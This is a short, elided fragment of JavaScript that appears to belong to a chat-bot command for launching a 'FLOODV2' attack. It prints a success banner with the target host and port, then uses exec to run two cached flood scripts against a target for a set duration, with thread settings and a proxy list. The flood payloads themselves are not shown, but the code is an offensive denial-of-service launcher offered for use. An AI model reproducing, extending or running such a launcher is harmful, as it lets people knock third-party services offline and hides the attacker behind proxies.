...
╭━✧「 <b>FLOODV2 Attack Sent Succes</b> ✅ 」
┃🎯 <b>Host:</b> ${hostname}
┃📍 <b>Port:</b> ${port}
...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
    ...
    const floodv2 = path.join(__dirname, `../lib/cache/floodv2`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${floodv2} ${target} ${duration} 64 16 proxy.txt`);
  },
};